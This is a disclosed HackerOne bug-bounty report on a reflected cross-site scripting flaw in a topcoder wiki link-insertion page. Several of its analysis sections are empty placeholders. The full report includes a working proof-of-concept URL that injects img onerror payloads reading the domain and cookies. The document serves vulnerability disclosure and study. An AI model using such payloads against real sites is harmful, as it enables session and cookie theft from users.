# Reflected XSS on https://apps.topcoder.com/wiki/

## Metadata
- **Source:** HackerOne
- **Report:** 866426 | https://hackerone.com/reports/866426
- **Submitted:** 2020-05-05
- **Reporter:** meryem0x
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
Hi :)  A reflected XSS occurs on https://apps.topcoder.com/wiki/plugins/tinymce/wysiwyg-insertlink.action when creating wiki pages.

## Steps To Reproduce:

A user can create wiki page on https://apps.topcoder.com/wiki/pages/createpage.action?spaceKey=tcwiki. A url can be inserted this page. When you click `Insert/Edit url` https://apps.topcoder.com/wiki/plugins/tinymce/wysiwyg-insertl

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
Hi :)  A reflected XSS occurs on https://apps.topcoder.com/wiki/plugins/tinymce/wysiwyg-insertlink.action when creating wiki pages.

## Steps To Reproduce:

A user can create wiki page on https://apps.topcoder.com/wiki/pages/createpage.action?spaceKey=tcwiki. A url can be inserted this page. When you click `Insert/Edit url` https://apps.topcoder.com/wiki/plugins/tinymce/wysiwyg-insertlink.action?draftType=page&spaceKey=tcwiki&currentspace=tcwiki&formname=createpageform&fieldname=wysiwygcontent&alias= page opens. You can change `alias` parameter and add `tooltip` parameter with JS codes. If a victim opens this url, XSS will execute. 

PoC:
https://apps.topcoder.com/wiki/plugins/tinymce/wysiwyg-insertlink.action?draftType=page&spaceKey=tcwiki&currentspace=tcwiki&formname=createpageform&fieldname=wysiwygcontent&alias=as%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&tooltip=as%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie)%3E

{F816079}
{F816080}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

</details>

---
*Analysed by Claude on 2026-05-24*
